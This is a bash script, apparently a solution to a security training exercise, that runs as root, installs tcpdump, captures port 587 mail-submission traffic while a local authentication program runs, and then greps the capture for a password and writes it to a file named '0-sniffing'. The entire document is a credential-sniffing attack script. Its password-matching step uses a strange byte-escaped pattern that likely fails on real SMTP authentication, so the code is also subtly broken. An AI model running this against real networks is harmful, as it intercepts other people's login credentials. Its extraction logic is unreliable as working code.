#!/bin/bash

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root. Please use sudo."
    exit 1
fi

# Install required dependencies
apt-get update
apt-get install -y tcpdump

# Run tcpdump to sniff network traffic and save to a pcap file
tcpdump -i any port 587 -w sniffed_traffic.pcap &

# Run the authentication script in the background
./user_authenticating_into_server &

# Wait for the authentication script to finish
wait

# Stop tcpdump
pkill tcpdump

# Extract password from pcap file
password=$(tcpdump -r sniffed_traffic.pcap -A | grep -oP 'P\xc3\xa1ssw0rd: \K(.*)')

# Store sniffed password in 0-sniffing file
echo "$password" > 0-sniffing

echo "Sniffed password stored in 0-sniffing file."

